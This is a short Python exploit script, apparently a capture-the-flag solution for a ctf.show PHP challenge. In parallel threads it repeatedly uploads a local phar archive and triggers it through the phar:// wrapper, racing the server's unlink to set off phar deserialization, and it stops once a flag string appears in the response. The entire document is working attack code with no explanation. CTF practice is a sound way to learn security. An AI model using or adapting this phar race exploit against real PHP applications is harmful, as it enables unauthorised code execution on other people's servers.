import requests
import time
import threading


success = False
def getPhar(phar):
    with open(phar,'rb') as p:
        return p.read()


def writePhar(url,data):
    print('writing...')
    requests.post(url,data)
    
def unlinkPhar(url,data):
    print('unlinking...')
    global success
    res = requests.post(url,data)
    if 'ctfshow{' in res.text and success is False:
        print(res.text)
        success = True
        
def main():
    global success
    url = 'http://d5fc2eb4-2fe7-4ce5-961f-6de31f014278.challenge.ctf.show/'
    phar = getPhar('phar.phar')
    while success is False:
        time.sleep(1)
        w = threading.Thread(target=writePhar,args=(url+'?fn=p.phar',phar))
        s = threading.Thread(target=unlinkPhar,args=(url+'?fn=phar://p.phar/test',''))
        w.start()
        s.start()
        
if __name__ == '__main__':
    main()
    

